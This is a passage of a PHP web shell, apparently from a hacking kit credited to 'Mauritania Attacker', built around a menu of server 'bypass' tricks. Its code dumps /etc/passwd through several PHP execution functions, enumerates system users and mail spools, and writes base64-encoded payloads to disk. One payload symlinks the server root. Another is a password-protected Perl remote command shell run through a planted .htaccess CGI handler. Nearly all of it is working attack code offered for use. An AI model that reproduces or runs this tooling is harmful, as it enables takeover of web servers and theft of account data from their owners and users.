echo"<center><h1>Yeah Let's Try Bypass This Server And Smile</h1><br><img src=https://media.giphy.com/media/cGrCQk6zbsvLO/giphy.gif><br><br>";		
echo '<center><div id="menu">';		
echo "<a href='?dir=$dir&do=grasy'>Bypass /etc/passwd</a><br><br>";
echo "<a href='?dir=$dir&do=nemcon'>Bypass Users Server</a><br><br>";
echo "<a href='?dir=$dir&do=cgipl'>Bypass Perl Security</a><br><br>";
echo "<a href='?dir=$dir&do=bypsrootwzp'>Bypass Root Path with Zip File</a><br><br>";
echo "<a href='?dir=$dir&do=bforb'>Bypass Root Path with system function</a><br><br>";
echo "<a href='?dir=$dir&do=rootexecbpass'>Bypass Root Path with exec function</a><br><br>";
echo "<a href='?dir=$dir&do=rootshelleexecbpass'>Bypass Root Path with shell_exec function</a><br><br>";
echo "<a href='?dir=$dir&do=posget'>Bypass posix_getpwuid</a><br><br>";
echo "<a href='?dir=$dir&do=suphp'>Bypass PHP Suhosin function blacklist</a><br><br>";
echo "<a href='?dir=$dir&do=suppet'>Bypass Functions suPHP_ConfigPath</a><br><br>";
echo "<a href='?dir=$dir&do=setphr'>Bypass suPHP Security</a><br><br>";
echo "<a href='?dir=$dir&do=simpelb'>Simple Bypasser</a><br><br>";
echo "<a href='?dir=$dir&do=ritf'>Read Files</a><br><br>";
echo "<a href='?dir=$dir&do=baidir'>Bypass Chmod Directory</a><br><br>";
echo "<a href='?dir=$dir&do=smod14'>Bypass SafeMode 2014 Priv8</a><br><br>";
?>
<?
} elseif($_GET['do'] == 'bforb') {
?>
<?
{
echo"<center><h1>Yeah Let's Try Bypass This Server And Smile</h1><br><img src=https://media.giphy.com/media/cGrCQk6zbsvLO/giphy.gif><br><br>";		
echo '<center><div id="menu">';		
echo "<a href='?dir=$dir&do=grasy'>Bypass /etc/passwd</a><br><br>";
echo "<a href='?dir=$dir&do=nemcon'>Bypass Users Server</a><br><br>";
echo "<a href='?dir=$dir&do=cgipl'>Bypass Perl Security</a><br><br>";
echo "<a href='?dir=$dir&do=bypsrootwzp'>Bypass Root Path with Zip File</a><br><br>";
echo "<a href='?dir=$dir&do=bforb'>Bypass Root Path with system function</a><br><br>";
echo "<a href='?dir=$dir&do=rootexecbpass'>Bypass Root Path with exec function</a><br><br>";
echo "<a href='?dir=$dir&do=rootshelleexecbpass'>Bypass Root Path with shell_exec function</a><br><br>";
echo "<a href='?dir=$dir&do=posget'>Bypass posix_getpwuid</a><br><br>";
echo "<a href='?dir=$dir&do=suphp'>Bypass PHP Suhosin function blacklist</a><br><br>";
echo "<a href='?dir=$dir&do=suppet'>Bypass Functions suPHP_ConfigPath</a><br><br>";
echo "<a href='?dir=$dir&do=setphr'>Bypass suPHP Security</a><br><br>";
echo "<a href='?dir=$dir&do=simpelb'>Simple Bypasser</a><br><br>";
echo "<a href='?dir=$dir&do=ritf'>Read Files</a><br><br>";
echo "<a href='?dir=$dir&do=baidir'>Bypass Chmod Directory</a><br><br>";
echo "<a href='?dir=$dir&do=smod14'>Bypass SafeMode 2014 Priv8</a><br><br>";
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass Root Path with system function</span><center><br>';

mkdir('bforb', 0755);
chdir('bforb');
$bforb = 'PGhlYWQ+PHRpdGxlPkJ5cGFzcyBCeXBhc3MgUm9vdCBQYXRoIGJ5IFZpcnVzYSBXb3JtPC90aXRsZT48L2hlYWQ+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3Lmljb25qLmNvbS9pY28vYy91L2N1MWJtcGdiMWsuaWNvIiB0eXBlPSJpbWFnZS94LWljb24iIC8+PHN0eWxlIHR5cGU9InRleHQvY3NzIj48IS0tIGJvZHkge2JhY2tncm91bmQtY29sb3I6IHRyYW5zcGFyZW50OyBmb250LWZhbWlseTpDb3VyaWVyCW1hcmdpbi1sZWZ0OiAwcHg7IG1hcmdpbi10b3A6IDBweDsgdGV4dC1hbGlnbjogY2VudGVyOyBOZXc7Zm9udC1zaXplOjEycHg7Y29sb3I6IzAwOTkwMDtmb250LXdlaWdodDo0MDA7fSBhe3RleHQtZGVjb3JhdGlvbjpub25lO30gYTpsaW5rIHtjb2xvcjojMDA5OTAwO30gYTp2aXNpdGVkIHtjb2xvcjojMDA3NzAwO30gYTpob3Zlcntjb2xvcjojMDBmZjAwO30gYTphY3RpdmUge2NvbG9yOiMwMDk5MDA7fSAtLT48IS0tIE1hZGUgQnkgVmlydXNhIFdvcm0gLS0+PC9zdHlsZT48YnI+PGJyPjxib2R5IGJnQ29sb3I9IjAwMDAwMCI+PHRyPjx0ZD48P3BocCBlY2hvICI8Zm9ybSBtZXRob2Q9J1BPU1QnIGFjdGlvbj0nJz4iIDsgZWNobyAiPGNlbnRlcj48aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nQnlwYXNzIGl0JyBuYW1lPSd2aXJ1c2EnPjwvY2VudGVyPiI7IGlmIChpc3NldCgkX1BPU1RbJ3ZpcnVzYSddKSl7IHN5c3RlbSgnbG4gLXMgLyB2aXJ1c2EudHh0Jyk7ICRmdmNrZW0gPSdUM0IwYVc5dWN5QkpibVJsZUdWeklFWnZiR3h2ZDFONWJVeHBibXR6RFFwRWFYSmxZM1J2Y25sSmJtUmxlQ0J6YzNOemMzTXVhSFJ0RFFwQlpHUlVlWEJsSUhSNGRDQXVjR2h3RFFwQlpHUklZVzVrYkdWeUlIUjRkQ0F1Y0dodyc7ICRmaWxlID0gZm9wZW4oIi5odGFjY2VzcyIsIncrIik7ICR3cml0ZSA9IGZ3cml0ZSAoJGZpbGUgLGJhc2U2NF9kZWNvZGUoJGZ2Y2tlbSkpOyAkdmlydXNhID0gc3ltbGluaygiLyIsInZpcnVzYS50eHQiKTsgJHJ0PSI8YnI+PGEgaHJlZj12aXJ1c2EudHh0IFRBUkdFVD0nX2JsYW5rJz48Zm9udCBjb2xvcj0jMDBiYjAwIHNpemU9MiBmYWNlPSdDb3VyaWVyIE5ldyc+PGI+QnlwYXNzZWQgU3VjY2Vzc2Z1bGx5PC9iPjwvZm9udD48L2E+IjsgZWNobyAiPGJyPjxicj48Yj5Eb25lLi4gITwvYj48YnI+PGJyPkNoZWNrIGxpbmsgZ2l2ZW4gYmVsb3cgZm9yIC8gZm9sZGVyIHN5bWxpbmsgPGJyPiRydDwvY2VudGVyPiI7fSBlY2hvICI8L2Zvcm0+IjsgID8+PC90ZD48L3RyPjwvYm9keT48L2h0bWw+';

$file = fopen("bforb.php" ,"w+");
$write = fwrite ($file ,base64_decode($bforb));
fclose($file);
chmod("bforb.php",0755);
echo "<iframe src=bforb/bforb.php width=60% height=60% frameborder=0></iframe>";
}	

?>
<?
}elseif($_GET['do'] == 'grasy') {?>
<?
{
echo"<center><h1>Yeah Let's Try Bypass This Server And Smile</h1><br><img src=https://media.giphy.com/media/cGrCQk6zbsvLO/giphy.gif><br><br>";		
echo '<center><div id="menu">';		
echo "<a href='?dir=$dir&do=grasy'>Bypass /etc/passwd</a><br><br>";
echo "<a href='?dir=$dir&do=nemcon'>Bypass Users Server</a><br><br>";
echo "<a href='?dir=$dir&do=cgipl'>Bypass Perl Security</a><br><br>";
echo "<a href='?dir=$dir&do=bypsrootwzp'>Bypass Root Path with Zip File</a><br><br>";
echo "<a href='?dir=$dir&do=bforb'>Bypass Root Path with system function</a><br><br>";
echo "<a href='?dir=$dir&do=rootexecbpass'>Bypass Root Path with exec function</a><br><br>";
echo "<a href='?dir=$dir&do=rootshelleexecbpass'>Bypass Root Path with shell_exec function</a><br><br>";
echo "<a href='?dir=$dir&do=posget'>Bypass posix_getpwuid</a><br><br>";
echo "<a href='?dir=$dir&do=suphp'>Bypass PHP Suhosin function blacklist</a><br><br>";
echo "<a href='?dir=$dir&do=suppet'>Bypass Functions suPHP_ConfigPath</a><br><br>";
echo "<a href='?dir=$dir&do=setphr'>Bypass suPHP Security</a><br><br>";
echo "<a href='?dir=$dir&do=simpelb'>Simple Bypasser</a><br><br>";
echo "<a href='?dir=$dir&do=ritf'>Read Files</a><br><br>";
echo "<a href='?dir=$dir&do=baidir'>Bypass Chmod Directory</a><br><br>";
echo "<a href='?dir=$dir&do=smod14'>Bypass SafeMode 2014 Priv8</a><br><br>";
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass /etc/passwd Priv8</span><br>Coded By Mauritania Attacker<center><br><br>';
echo '<div class="tul"><font color="ee5500" face="Tahoma, Geneva, sans-serif" style="font-size: 8pt">


<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with System Function
<form method="post">
<input type="submit" value="Bypass" name="syst">
</form>
</center><br>
</p>

<p><center>Bypass with Passthru Function
<form method="post">
<font face="Tahoma" color="#007700" size="2pt">
<input type="submit" value="Bypass" name="passth">
</form>
</center><br>
</p>

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with exec Function
<form method="post">
<input type="submit" value="Bypass" name="ex">
</form>
</center><br>
</p>

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with shell_exec Function
<form method="post">
<input type="submit" value="Bypass" name="shex">
</form>
</center><br>
</p>

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with posix_getpwuid Function
<form method="post">
<input type="submit" value="Bypass" name="mauritania">
</form>
</center><br>
</p>

<center>';
    

//System Function //
if($_POST['syst'])
{

echo"<textarea class='area' cols='65' rows='15'>";
echo system("cat /etc/passwd");
echo"</textarea><br>";
echo"
<br>
<b>
</b>
<br>
";
}
echo '
</center>
<center>';
    


//Passthru Function //
if($_POST['passth'])
{
echo"<textarea class='area' cols='65' rows='15'>";
echo passthru("cat /etc/passwd");
echo"</textarea><br>";
echo"
<br>
<b>

</b>
<br>
";
  
}


echo '
</center>
<center>';
    


//exec Function //
if($_POST['ex'])
{
echo"<textarea class='area' cols='65' rows='15'>";
echo exec("cat /etc/passwd");
echo"</textarea><br>";
echo"
<br>
<b>
</b>
<br>
";
}


echo '
</center>
<center>';


//exec Function //
if($_POST['shex'])
{
echo"<textarea class='area' cols='65' rows='15'>";
echo shell_exec("cat /etc/passwd");
echo"</textarea><br>";
echo"
<br>
<b>
</b>
<br>
";
}
echo '</center>
<center>';
    


//posix_getpwuid Function //
if($_POST['mauritania'])
{
echo"<textarea class='area' cols='65' rows='15'>";
for($uid=0;$uid<60000;$uid++){ 
$ara = posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
print "\n";
}
}
echo"</textarea><br>";
echo"
<br>
<b>
</b>
<br>
";
}
}
?>

<?
}elseif($_GET['do'] == 'nemcon') {
?>
<?
{
echo"<center><h1>Yeah Let's Try Bypass This Server And Smile</h1><br><img src=https://media.giphy.com/media/cGrCQk6zbsvLO/giphy.gif><br><br>";		
echo '<center><div id="menu">';		
echo "<a href='?dir=$dir&do=grasy'>Bypass /etc/passwd</a><br><br>";
echo "<a href='?dir=$dir&do=nemcon'>Bypass Users Server</a><br><br>";
echo "<a href='?dir=$dir&do=cgipl'>Bypass Perl Security</a><br><br>";
echo "<a href='?dir=$dir&do=bypsrootwzp'>Bypass Root Path with Zip File</a><br><br>";
echo "<a href='?dir=$dir&do=bforb'>Bypass Root Path with system function</a><br><br>";
echo "<a href='?dir=$dir&do=rootexecbpass'>Bypass Root Path with exec function</a><br><br>";
echo "<a href='?dir=$dir&do=rootshelleexecbpass'>Bypass Root Path with shell_exec function</a><br><br>";
echo "<a href='?dir=$dir&do=posget'>Bypass posix_getpwuid</a><br><br>";
echo "<a href='?dir=$dir&do=suphp'>Bypass PHP Suhosin function blacklist</a><br><br>";
echo "<a href='?dir=$dir&do=suppet'>Bypass Functions suPHP_ConfigPath</a><br><br>";
echo "<a href='?dir=$dir&do=setphr'>Bypass suPHP Security</a><br><br>";
echo "<a href='?dir=$dir&do=simpelb'>Simple Bypasser</a><br><br>";
echo "<a href='?dir=$dir&do=ritf'>Read Files</a><br><br>";
echo "<a href='?dir=$dir&do=baidir'>Bypass Chmod Directory</a><br><br>";
echo "<a href='?dir=$dir&do=smod14'>Bypass SafeMode 2014 Priv8</a><br><br>";
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass Users Server Priv8</span><br>Coded By Mauritania Attacker<center><br><br>';
echo '
<div class="tul"><font color="ee5500" face="Tahoma, Geneva, sans-serif" style="font-size: 8pt">

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with awk program
<form method="post">
<input type="submit" value="Bypass" name="awk">
</form>
</center><br>
</p>



<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with System Function
<form method="post">
<input type="submit" value="Bypass" name="syst">
</form>
</center><br>
</p>

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with Passthru Function
<form method="post">
<input type="submit" value="Bypass" name="passth">
</form>
</center><br>
</p>

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with exec Function
<form method="post">
<input type="submit" value="Bypass" name="ex">
</form>
</center><br>
</p>

<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with shell_exec Function
<form method="post">
<input type="submit" value="Bypass" name="shex">
</form>
</center><br>
</p><center>';
    
}
//Awk Program //
if ($_POST['awk']) {
echo"<textarea class='area' cols='65' rows='15'>";
echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
echo "</textarea><br>";
echo "
<br>
<b>
</b>
<br>
";
}
echo "</center><center>";
    
//System Function //
if ($_POST['syst']) {
echo"<textarea class='area' cols='65' rows='15'>";
echo system("ls /var/mail");
echo "</textarea><br>";
echo "
<br>
<b>
</b>
<br>
";
}

echo "</center><center>";
    
//Passthru Function //
if ($_POST['passth']) {
echo"<textarea class='area' cols='65' rows='15'>";
echo passthru("ls /var/mail");
echo "</textarea><br>";
echo "
<br>
<b>
</b>
<br>
";
}
echo "</center><center>";
    
//exec Function //
if ($_POST['ex']) {
echo"<textarea class='area' cols='65' rows='15'>";
echo exec("ls /var/mail");
echo "</textarea><br>";
echo "
<br>
<b>

</b>
<br>
";
}

echo "</center><center>";
    
//exec Function //
if ($_POST['shex']) {
echo"<textarea class='area' cols='65' rows='15'>";
echo shell_exec("ls /var/mail");
echo "</textarea><br>";
echo "
<br>
<b>
</b>
<br>
";
}

?>
<?}elseif($_GET['do'] == 'cgipl') {?>
<?
{
echo"<center><h1>Yeah Let's Try Bypass This Server And Smile</h1><br><img src=https://media.giphy.com/media/cGrCQk6zbsvLO/giphy.gif><br><br>";		
echo '<center><div id="menu">';		
echo "<a href='?dir=$dir&do=grasy'>Bypass /etc/passwd</a><br><br>";
echo "<a href='?dir=$dir&do=nemcon'>Bypass Users Server</a><br><br>";
echo "<a href='?dir=$dir&do=cgipl'>Bypass Perl Security</a><br><br>";
echo "<a href='?dir=$dir&do=bypsrootwzp'>Bypass Root Path with Zip File</a><br><br>";
echo "<a href='?dir=$dir&do=bforb'>Bypass Root Path with system function</a><br><br>";
echo "<a href='?dir=$dir&do=rootexecbpass'>Bypass Root Path with exec function</a><br><br>";
echo "<a href='?dir=$dir&do=rootshelleexecbpass'>Bypass Root Path with shell_exec function</a><br><br>";
echo "<a href='?dir=$dir&do=posget'>Bypass posix_getpwuid</a><br><br>";
echo "<a href='?dir=$dir&do=suphp'>Bypass PHP Suhosin function blacklist</a><br><br>";
echo "<a href='?dir=$dir&do=suppet'>Bypass Functions suPHP_ConfigPath</a><br><br>";
echo "<a href='?dir=$dir&do=setphr'>Bypass suPHP Security</a><br><br>";
echo "<a href='?dir=$dir&do=simpelb'>Simple Bypasser</a><br><br>";
echo "<a href='?dir=$dir&do=ritf'>Read Files</a><br><br>";
echo "<a href='?dir=$dir&do=baidir'>Bypass Chmod Directory</a><br><br>";
echo "<a href='?dir=$dir&do=smod14'>Bypass SafeMode 2014 Priv8</a><br><br>";
echo "<a href='?dir=$dir&do=nemcon'>Bypass Users Server</a><br><br>";

mkdir('cgipl', 0755);
chdir('cgipl');
$kokdosya = ".htaccess";
$dosya_adi = "$kokdosya";
$dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
$metin = "AddType application/x-httpd-cgi .root 
AddType application/x-httpd-cgi .root 
AddHandler cgi-script .root 
AddHandler cgi-script .root";    
fwrite ( $dosya , $metin ) ;
fclose ($dosya);
$cgipl = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWFpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyA8YiBzdHlsZT0iY29sb3I6YmxhY2s7YmFja2dyb3VuZC1jb2xvcjojZmZmZjY2Ij5Bbm9uR2hvc3QgUGVybCBzaGVsbDwvYj4gIyBzZXJ2ZXINCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBDb25maWd1cmF0aW9uOiBZb3UgbmVlZCB0byBjaGFuZ2Ugb25seSAkUGFzc3dvcmQgYW5kICRXaW5OVC4gVGhlIG90aGVyDQojIHZhbHVlcyBzaG91bGQgd29yayBmaW5lIGZvciBtb3N0IHN5c3RlbXMuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQokUGFzc3dvcmQgPSAiZ2hvc3QiOwkJIyBDaGFuZ2UgdGhpcy4gWW91IHdpbGwgbmVlZCB0byBlbnRlciB0aGlzDQoJCQkJIyB0byBsb2dpbi4NCg0KJFdpbk5UID0gMDsJCQkjIFlvdSBuZWVkIHRvIGNoYW5nZSB0aGUgdmFsdWUgb2YgdGhpcyB0byAxIGlmDQoJCQkJIyB5b3UncmUgcnVubmluZyB0aGlzIHNjcmlwdCBvbiBhIFdpbmRvd3MgTlQNCgkJCQkjIG1hY2hpbmUuIElmIHlvdSdyZSBydW5uaW5nIGl0IG9uIFVuaXgsIHlvdQ0KCQkJCSMgY2FuIGxlYXZlIHRoZSB2YWx1ZSBhcyBpdCBpcy4NCg0KJE5UQ21kU2VwID0gIiYiOwkJIyBUaGlzIGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMNCgkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFdpbmRvd3MgTlQuDQoNCiRVbml4Q21kU2VwID0gIjsiOwkJIyBUaGlzIGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMNCgkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFVuaXguDQoNCiRDb21tYW5kVGltZW91dER1cmF0aW9uID0gMTA7CSMgVGltZSBpbiBzZWNvbmRzIGFmdGVyIGNvbW1hbmRzIHdpbGwgYmUga2lsbGVkDQoJCQkJIyBEb24ndCBzZXQgdGhpcyB0byBhIHZlcnkgbGFyZ2UgdmFsdWUuIFRoaXMgaXMNCgkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMgdGhhdCBtYXkgaGFuZyBvciB0aGF0DQoJCQkJIyB0YWtlIHZlcnkgbG9uZyB0byBleGVjdXRlLCBsaWtlICJmaW5kIC8iLg0KCQkJCSMgVGhpcyBpcyB2YWxpZCBvbmx5IG9uIFVuaXggc2VydmVycy4gSXQgaXMNCgkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4NCg0KJFNob3dEeW5hbWljT3V0cHV0ID0gMTsJCSMgSWYgdGhpcyBpcyAxLCB0aGVuIGRhdGEgaXMgc2VudCB0byB0aGUNCgkJCQkjIGJyb3dzZXIgYXMgc29vbiBhcyBpdCBpcyBvdXRwdXQsIG90aGVyd2lzZQ0KCQkJCSMgaXQgaXMgYnVmZmVyZWQgYW5kIHNlbmQgd2hlbiB0aGUgY29tbWFuZA0KCQkJCSMgY29tcGxldGVzLiBUaGlzIGlzIHVzZWZ1bCBmb3IgY29tbWFuZHMgbGlrZQ0KCQkJCSMgcGluZywgc28gdGhhdCB5b3UgY2FuIHNlZSB0aGUgb3V0cHV0IGFzIGl0DQoJCQkJIyBpcyBiZWluZyBnZW5lcmF0ZWQuDQoNCiMgRE9OJ1QgQ0hBTkdFIEFOWVRISU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISENCg0KJENtZFNlcCA9ICgkV2luTlQgPyAkTlRDbWRTZXAgOiAkVW5peENtZFNlcCk7DQokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7DQokUGF0aFNlcCA9ICgkV2luTlQgPyAiXFwiIDogIi8iKTsNCiRSZWRpcmVjdG9yID0gKCRXaW5OVCA/ICIgMj4mMSAxPiYyIiA6ICIgMT4mMSAyPiYxIik7DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUmVhZHMgdGhlIGlucHV0IHNlbnQgYnkgdGhlIGJyb3dzZXIgYW5kIHBhcnNlcyB0aGUgaW5wdXQgdmFyaWFibGVzLiBJdA0KIyBwYXJzZXMgR0VULCBQT1NUIGFuZCBtdWx0aXBhcnQvZm9ybS1kYXRhIHRoYXQgaXMgdXNlZCBmb3IgdXBsb2FkaW5nIGZpbGVzLg0KIyBUaGUgZmlsZW5hbWUgaXMgc3RvcmVkIGluICRpbnsnZid9IGFuZCB0aGUgZGF0YSBpcyBzdG9yZWQgaW4gJGlueydmaWxlZGF0YSd9Lg0KIyBPdGhlciB2YXJpYWJsZXMgY2FuIGJlIGFjY2Vzc2VkIHVzaW5nICRpbnsndmFyJ30sIHdoZXJlIHZhciBpcyB0aGUgbmFtZSBvZg0KIyB0aGUgdmFyaWFibGUuIE5vdGU6IE1vc3Qgb2YgdGhlIGNvZGUgaW4gdGhpcyBmdW5jdGlvbiBpcyB0YWtlbiBmcm9tIG90aGVyIENHSQ0KIyBzY3JpcHRzLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFJlYWRQYXJzZSANCnsNCglsb2NhbCAoKmluKSA9IEBfIGlmIEBfOw0KCWxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7DQoJDQoJJE11bHRpcGFydEZvcm1EYXRhID0gJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC87DQoNCglpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJHRVQiKQ0KCXsNCgkJJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307DQoJfQ0KCWVsc2lmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIlBPU1QiKQ0KCXsNCgkJYmlubW9kZShTVERJTikgaWYgJE11bHRpcGFydEZvcm1EYXRhICYgJFdpbk5UOw0KCQlyZWFkKFNURElOLCAkaW4sICRFTlZ7J0NPTlRFTlRfTEVOR1RIJ30pOw0KCX0NCg0KCSMgaGFuZGxlIGZpbGUgdXBsb2FkIGRhdGENCglpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykNCgl7DQoJCSRCb3VuZGFyeSA9ICctLScuJDE7ICMgcGxlYXNlIHJlZmVyIHRvIFJGQzE4NjcgDQoJCUBsaXN0ID0gc3BsaXQoLyRCb3VuZGFyeS8sICRpbik7IA0KCQkkSGVhZGVyQm9keSA9ICRsaXN0WzFdOw0KCQkkSGVhZGVyQm9keSA9fiAvXHJcblxyXG58XG5cbi87DQoJCSRIZWFkZXIgPSAkYDsNCgkJJEJvZHkgPSAkJzsNCiAJCSRCb2R5ID1+IHMvXHJcbiQvLzsgIyB0aGUgbGFzdCBcclxuIHdhcyBwdXQgaW4gYnkgTmV0c2NhcGUNCgkJJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7DQoJCSRIZWFkZXIgPX4gL2ZpbGVuYW1lPVwiKC4rKVwiLzsgDQoJCSRpbnsnZid9ID0gJDE7IA0KCQkkaW57J2YnfSA9fiBzL1wiLy9nOw0KCQkkaW57J2YnfSA9fiBzL1xzLy9nOw0KDQoJCSMgcGFyc2UgdHJhaWxlcg0KCQlmb3IoJGk9MjsgJGxpc3RbJGldOyAkaSsrKQ0KCQl7IA0KCQkJJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87DQoJCQkkbGlzdFskaV0gPX4gL1wiKFx3KylcIi87DQoJCQkka2V5ID0gJDE7DQoJCQkkdmFsID0gJCc7DQoJCQkkdmFsID1+IHMvKF4oXHJcblxyXG58XG5cbikpfChcclxuJHxcbiQpLy9nOw0KCQkJJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSRpbnska2V5fSA9ICR2YWw7IA0KCQl9DQoJfQ0KCWVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQ0KCXsNCgkJQGluID0gc3BsaXQoLyYvLCAkaW4pOw0KCQlmb3JlYWNoICRpICgwIC4uICQjaW4pDQoJCXsNCgkJCSRpblskaV0gPX4gcy9cKy8gL2c7DQoJCQkoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOw0KCQkJJGtleSA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsNCgkJCSRpbnska2V5fSAuPSAkdmFsOw0KCQl9DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBQYWdlIEhlYWRlcg0KIyBBcmd1bWVudCAxOiBGb3JtIGl0ZW0gbmFtZSB0byB3aGljaCBmb2N1cyBzaG91bGQgYmUgc2V0DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRQYWdlSGVhZGVyDQp7DQoJJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7DQoJJEVuY29kZWRDdXJyZW50RGlyID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsNCglwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCglwcmludCA8PEVORDsNCjxodG1sPg0KPGhlYWQ+DQo8dGl0bGU+QW5vbkdob3N0IFBlcmwgc2hlbGw8L3RpdGxlPg0KJEh0bWxNZXRhSGVhZGVyDQoNCjxtZXRhIG5hbWU9ImtleXdvcmRzIiBjb250ZW50PSJBbm9uR2hvc3QsQW5vbkdob3N0LEFub25HaG9zdC5pbmZvLGhhY2tlciI+DQo8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iQW5vbkdob3N0LEFub25HaG9zdCxBbm9uR2hvc3QuaW5mbyxoYWNrZXIiPg0KPC9oZWFkPg0KPGJvZHkgb25Mb2FkPSJkb2N1bWVudC5mLkBfLmZvY3VzKCkiIGJnY29sb3I9IiNGRkZGRkYiIHRvcG1hcmdpbj0iMCIgbGVmdG1hcmdpbj0iMCIgbWFyZ2lud2lkdGg9IjAiIG1hcmdpbmhlaWdodD0iMCIgdGV4dD0iI0ZGMDAwMCI+DQo8dGFibGUgYm9yZGVyPSIxIiB3aWR0aD0iMTAwJSIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSIyIj4NCjx0cj4NCjx0ZCBiZ2NvbG9yPSIjRkZGRkZGIiBib3JkZXJjb2xvcj0iI0ZGRkZGRiIgYWxpZ249ImNlbnRlciIgd2lkdGg9IjElIj4NCjxiPjxmb250IHNpemU9IjIiPiM8L2ZvbnQ+PC9iPjwvdGQ+DQo8dGQgYmdjb2xvcj0iI0ZGRkZGRiIgd2lkdGg9Ijk4JSI+PGZvbnQgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+PGI+IA0KPGIgc3R5bGU9ImNvbG9yOmJsYWNrO2JhY2tncm91bmQtY29sb3I6I2ZmZmY2NiI+QW5vbkdob3N0IFBlcmwgc2hlbGw8L2I+IENvbm5lY3RlZCB0byAkU2VydmVyTmFtZTwvYj48L2ZvbnQ+PC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQgY29sc3Bhbj0iMiIgYmdjb2xvcj0iI0ZGRkZGRiI+PGZvbnQgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+DQoNCjxhIGhyZWY9I